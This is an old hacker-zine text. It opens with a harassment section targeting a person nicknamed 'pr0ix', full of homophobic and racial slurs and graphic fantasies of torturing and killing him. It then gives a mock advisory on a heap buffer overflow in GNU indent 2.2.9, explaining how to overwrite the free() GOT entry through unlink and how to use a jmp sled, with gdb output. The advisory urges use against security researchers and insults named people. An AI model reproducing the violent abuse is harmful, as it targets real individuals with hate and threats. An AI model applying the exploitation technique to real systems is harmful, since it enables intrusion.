 #1 - Pr0ix is gay, and he will try to have sex with you in your ass if you even pretend to be his friend.

 #2 - Pr0ix leeches exploitz to g0vb0i who immediately uploadz 2 hack.co.za with some lame php script he got on
      the web 5 secs b4 he emails it to ofir@securityfocus.com. luckily, pr0ix+govb0i r so fucking stupid they
      cant even paste an email witout spelling errorz so none of the emails ever gets thru.

 #3 - pr0ix is fat and dreamz about joining the romanian xf0rze.

 #9 - his nick has a number in it

 #10 - he's italian

> 10 things to d0 wit pr0ix [By: uNkl m0lti13hm0r]

 #1  - make a monkey with the ebola virus bite pr0ix dick off and then he will sit in there and bleed without 
       f00d or water for a week or two while waiting for the death of the virus. if he bleedz to fast we'll just
       giv him a blood transfer.

 #2  - we cud take a giljotine and ch0p off hiz fingers/c0q/toez and leave him in a smaaaalll room, and wait for
       the blood go up so much he could swim in it, then we shoot him in his fuqing kneecap wit a shotgun and     
       watch him drown in his own blood wit the videocameraz we mount in the room\


 #3  - we take a chainsaw and stick it down his fuqn throat and watch his whole body get sawed in a 100 piecez
       while the ch41ns4w goesz all crazy


 #4  - slit his m0thafukn throat wit an openbsd cd then send the cd back to theo, 
       asking for a refund and watch theo get HIV

 #5  - lock him in a room and play h4ppy tr3e fri3nds songs all nights and wait till cleavez his own skull wit      
       the axe we accidentally leave in the room


 #6  - we pour around 50 litres of nap4lm on him and throw cigarettez on him

 #7  - we d0 it the 0ld skewl way: we hang him on the streetz
       (after about 5 hourz wit stun gun electrocution+chinese torture of courze)

 #8  - we hammer his ballz with a b4d4zz sledgehamm0r and then we pour VX gas down his throat and 
       watch his skin melt, and then we laugh as he spits up hiz own fuqn guts HEH

 #9  - we take a rope around his non existant c0q and the other end after a car.. 
       w3 start the car and drag him after making his hole skin get burnt off.. 
       if hes still alive we beat his fuqin head in wit an aliminium baseball bat

 #10 - gather 200 blaqh@z and make them all shit down pr0ixz throat untill he dies   2

          Software: indent
           Version: 2.2.9
     Vulnerability: buffer overflow while parsing .c file
        Found date: Aug 2002
      Release date: today you stupid whitehat boy
       Researchers: Winnie The Pooh Hacking Squadron
    Favourite food: whitehat soup

[0] LICENSE

    1) No whitehat whore can use this in his pseudo-security work
    2) divineint can't trade exploit attached to this advisory on 
       #darknet@efnet nor other lame channel (for people who don't 
       know it yet - his new nick is illumanti(z), is he hidding ?!) 
    3) Every hacker can implement exploit for this vuln in his
       codes to protect them from script kiddies and whitehats.
    4) WtPHS strongly encourage hackers to use this against
       whitehats.
    5) WtPHS don't give a shit if you hurt yourself

[1] INTRO

    indent is really fucking leet tool that improves appearance
    of C source code. It was designed to help people reading
    sources written by damn stupid and unskilled programmers like
    You Dong-Hun or Theo the Radt. It is really helpful nowadays 
    because of that whores who think they are coders. Unfortunatelly 
    authors of indent also made their software vulnerable to buffer 
    overflow. 

[2] DETAILS

    handle_token_colon(...) is vulnerable function. Buffer overflow
    occurs while parsing text (from .c file of korz), which indent
    treat like label. It copies whole 'label' to, 1000 bytes long,
    buffer on heap, without bounds checking. (Note for divineint-alike
    people: such overflow can lead to overwrite of heap stuctures and
    as result of this - arbitrary code execution).
    
    This is vulnerable part of handle_token_colon(...) function:

        for (t_ptr = s_code; *t_ptr; ++t_ptr)
        {
            *e_lab++ = *t_ptr;  /* turn everything so far into a label */
        }

    (Note for gorion(*)-alike people: this loop will copy as long as NULL
     byte will be find in source string)
     
[3] EXPLOITATION 

    This section is needed for stupid people like divineint or Lorenzo 
    Hernandez Garcia-Hierro (Good Lord! I feel like in south-american 
    telenovel saing his name).

    Smart people choose clear_buf_break_list() function to cause code
    execution. This function is executed just after our vulnerable loop,
    so we don't risk application crash. indent breaks source code and 
    makes double-linked list (buf_break_list) of code parts. Mentioned
    function free()'s all buf_break_list entries. 
    
    This double-linked list entries are allocated after 'labbuf' (e_lab 
    points to labbuf) so we are able to overwrite it. 
    
    Now exploitation is very easy. Overwrite free() GOT entry with and
    make clear_buf_break_list() loop run once again by setting 'prev'
    field of buf_break_st_ty struct to some readable value.
    
    Exploit for this vulnerability for indent 2.2.9 from slackware 9.0
    is attached to this advisory.

[4] EDUCATIONAL VALUE

    Whats educational here? One technique used in this exploit. Lets call
    FD = WHAT and BK = WHERE-8. People with IQ > 75 knows that unlink() 
    will do *(WHAT+0xc)=(WHERE-8) except *((WHERE-8)+8) = WHAT. 
    
    If we point WHAT to NOPs before our shellcode, unlink() will change
    few of our NOPs to something else. Executing this 'somethingelse'
    will probably crash our application. It looks like this:
    
    Before unlink():
    
       (gdb) x/20i 0x805b440
        0x805b440:      nop
        0x805b441:      nop

        0x805b450:      nop
        0x805b451:      nop
        0x805b452:      nop
        0x805b453:      nop
        (gdb) x/x 0x8058dc8
        0x8058dc8 <_GLOBAL_OFFSET_TABLE_+144>:  0x40019f52
    
    After unlink():
    
        (gdb) x/x 0x8058dc8
        0x8058dc8 <_GLOBAL_OFFSET_TABLE_+144>:  0x0805b440
        (gdb) x/20i 0x805b440
        0x805b440:      nop
        0x805b441:      nop
        0x805b442:      nop
        0x805b443:      nop
        0x805b444:      nop
        0x805b445:      nop
        0x805b446:      nop
        0x805b447:      nop
        0x805b448:      nop
        0x805b449:      nop
        0x805b44a:      nop
        0x805b44b:      nop
        0x805b44c:      rorb   $0x90,0x90900805(%ebp)
        0x805b453:      nop
        0x805b454:      nop
        0x805b455:      nop
        0x805b456:      nop
        0x805b457:      nop
        0x805b458:      nop
        0x805b459:      nop
	
    Next call to free() will jump to 0x805b440. If execution flow will 
    reach 0x805b44c, program will crash at this instruction.
    
    Solution is simple, however WtPHS don't remember anybody describing 
    it before, so ... here it is: Instead of NOPs you can use relative 
    jmp's like this:
    
    Before unlink():
    
        (gdb) x/20i 0x805b440
	0x805b440:      jmp    0x805b44a
	0x805b442:      jmp    0x805b44c
	0x805b444:      jmp    0x805b44e
	0x805b446:      jmp    0x805b450
	0x805b448:      jmp    0x805b452
	0x805b44a:      jmp    0x805b454
	0x805b44c:      jmp    0x805b456
	0x805b44e:      jmp    0x805b458
	0x805b450:      jmp    0x805b45a
	0x805b452:      jmp    0x805b45c
	0x805b454:      jmp    0x805b45e
	0x805b456:      jmp    0x805b460
	0x805b458:      jmp    0x805b462
	0x805b45a:      jmp    0x805b464
	0x805b45c:      jmp    0x805b466
	0x805b45e:      jmp    0x805b468
	0x805b460:      jmp    0x805b46a

	This way we jumped over shitty instruction. These jmps
	will lead execution flow to our shellcode, but to be sure
	that no jmp will jump into middle of shellcode you have
	to put few (at least 8) NOPs before shellcode. Than last
	jmp will jump to NOPs and than shellcode will be executed
	properly.
    
[5] IMPACT

    Possible impact is quite big. For example companies and software
    developers that are terrified because of their software is damn 
    shitty (Cisco, Apache, OpenBSD, Linux Kernel first come to our
    mind) could implement exploit for this vuln into their source 
    codes to make hackers life difficult.
    
[6] FLAMES, SHOUTOUTS and FINAL NOTES

    *) no, divineint, you can't get our juarez - stop begging for it
       biatch
    *) no, Stefan Esser, you can't steal our juarez and public it
       as your own, because you are to stupid to own us.
    *) shoutouts to our brotherly squad - Mickey Mouse Hacking Squadron
    *) shoutouts to PHC for terrorizing whitehats and full-disclosure
    *) recent OpenSSH vulnerability is exploitable
    *) greetings to Lorenzo Hernandes Garcia-Hierro for making us
       laught on the floor while reading his posts.    
    *) kudos to Alan Alexander Milne (R.I.P - 1956)
